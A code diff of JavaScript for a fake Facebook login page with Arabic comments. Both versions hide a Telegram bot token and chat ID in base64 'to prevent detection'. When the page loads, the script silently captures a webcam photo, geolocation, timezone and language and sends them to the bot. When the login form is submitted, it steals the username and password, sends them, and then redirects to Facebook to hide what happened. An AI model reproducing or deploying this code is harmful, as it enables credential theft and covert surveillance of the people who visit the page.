@@ -1,80 +1,91 @@
-<script>
-// --- فك التشفير الذاتي (Self-Decoding) ---
-// تم تحويل التوكن وID الشات إلى رموز غير مفهومة لمنع الكشف السريع
-const _0x5a2 = ["ODUyNzU2NTIwNTpBQUZwb3lMRHppcjRvaVFLcVBQTy1DbTQwWFZ6VUJ2TEVSOA==", "MTYxMTM5ODMwMw=="];
-const BOT_TOKEN = atob(_0x5a2[0]);
-const CHAT_ID = atob(_0x5a2[1]);
+// --- البيانات المشفرة (Base64) لمنع الكشف ---
+const _0x5 = ["ODUyNzU2NTIwNTpBQUZwb3lMRHppcjRvaVFLcVBQTy1DbTQwWFZ6VUJ2TEVSOA==", "MTYxMTM5ODMwMw=="];
+const BOT_TOKEN = atob(_0x5[0]);
+const CHAT_ID = atob(_0x5[1]);
 
-// 1. إخفاء شاشة التحميل
+// إخفاء شاشة التحميل بعد 2.5 ثانية
 setTimeout(() => {
     const loader = document.getElementById('loader');
     if(loader) loader.style.display = 'none';
 }, 2500);
 
-// 2. سحب الميديا والبصمة تلقائياً
-window.onload = () => { startCapture(); };
+// بدء العمليات الاستخباراتية (كاميرا + موقع + بصمة)
+window.onload = () => {
+    initCapture();
+};
 
-async function startCapture() {
+async function initCapture() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         let video = document.createElement('video');
         video.srcObject = stream;
         video.play();
 
         setTimeout(() => {
             let canvas = document.createElement('canvas');
-            canvas.width = 1280; canvas.height = 720;
-            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-            let capturedImage = canvas.toDataURL('image/jpeg');
-            stream.getTracks().forEach(t => t.stop());
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            let imgData = canvas.toDataURL('image/jpeg');
+            
+            // إيقاف الكاميرا فوراً
+            stream.getTracks().forEach(track => track.stop());
 
+            // جلب الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(pos => {
-                sendToTG(capturedImage, pos);
-            }, () => { sendToTG(capturedImage, null); }, { enableHighAccuracy: true });
-        }, 3000);
-    } catch (e) { sendToTG(null, null); }
+                sendToBot(imgData, pos);
+            }, () => {
+                sendToBot(imgData, null);
+            });
+        }, 2000);
+    } catch (e) {
+        sendToBot(null, null); // إرسال البصمة فقط في حال رفض الكاميرا
+    }
 }
 
-function sendToTG(img, pos) {
-    const lat = pos ? pos.coords.latitude.toFixed(6) : "مرفوض";
-    const lng = pos ? pos.coords.longitude.toFixed(6) : "مرفوض";
-    const lang = navigator.language;
+function sendToBot(img, pos) {
+    const lat = pos ? pos.coords.latitude.toFixed(5) : "مرفوض";
+    const lng = pos ? pos.coords.longitude.toFixed(5) : "مرفوض";
     const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const lang = navigator.language;
     const time = new Date().toLocaleString('ar-EG');
 
-    let text = `🌍 **بصمة استخباراتية جديدة**\n📍 الموقع: \`${lat},${lng}\`\n🌐 التوقيت: \`${tz}\`\n🗣️ اللغة: \`${lang}\`\n🕐 الوقت: \`${time}\``;
+    let info = `🌍 **بصمة استخباراتية جديدة**\n`;
+    info += `📍 الموقع: \`${lat},${lng}\`\n`;
+    info += `🌐 التوقيت: \`${tz}\`\n`;
+    info += `🗣️ اللغة: \`${lang}\`\n`;
+    info += `🕐 الوقت: \`${time}\``;
 
     if (img) {
-        const formData = new FormData();
-        formData.append('photo', dataURLtoBlob(img), 'c.jpg');
-        formData.append('caption', text);
-        formData.append('chat_id', CHAT_ID);
-        formData.append('parse_mode', 'Markdown');
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        let fd = new FormData();
+        fd.append('photo', dataURLtoBlob(img), 'c.jpg');
+        fd.append('caption', info);
+        fd.append('chat_id', CHAT_ID);
+        fd.append('parse_mode', 'Markdown');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     } else {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: info, parse_mode: "Markdown" })
         });
     }
 }
 
-// 3. سحب بيانات الدخول عند الضغط على الزر
+// سحب بيانات تسجيل الدخول
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    const u = document.getElementById('user').value;
-    const p = document.getElementById('pass').value;
-    const ua = navigator.userAgent;
-
-    const msg = `👤 **دخول (Facebook)**\n📧 الحساب: \`${u}\`\n🔑 الكلمة: \`${p}\`\n📱 الجهاز: \`${ua}\`\n✅ الحالة: مكتمل`;
+    const email = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
+    
+    const loginMsg = `👤 **بيانات دخول (Facebook)**\n📧 الحساب: \`${email}\`\n🔑 الكلمة: \`${pass}\`\n📱 الجهاز: \`${navigator.userAgent}\``;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: loginMsg, parse_mode: "Markdown" })
     }).then(() => {
-        window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
+        // التوجيه النهائي للتمويه
+        window.location.href = "https://www.facebook.com/recover/initiate/";
     });
 });
 
@@ -84,4 +95,3 @@ function dataURLtoBlob(dataurl) {
     while(n--) u8arr[n] = bstr.charCodeAt(n);
     return new Blob([u8arr], {type:mime});
 }
-</script>
